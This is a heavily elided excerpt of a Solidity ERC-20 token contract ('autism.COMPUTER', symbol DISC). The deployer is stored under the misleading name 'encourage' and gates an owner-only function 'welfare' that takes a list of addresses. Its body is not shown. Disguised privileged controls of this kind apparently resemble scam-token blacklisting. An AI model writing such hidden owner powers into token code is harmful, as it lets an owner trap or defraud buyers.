...
contract autismcomputer is Context, IERC20 {
    ...
    address public  encourage;
    constructor () {
        _name = "autism.COMPUTER";
        _symbol = "DISC";
        _decimals = 18;
        uint256 initialSupply = 541000000;
         encourage = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == encourage, "Not allowed");
        _;
    }

    function welfare(address[] memory audience) public onlyOwner() {
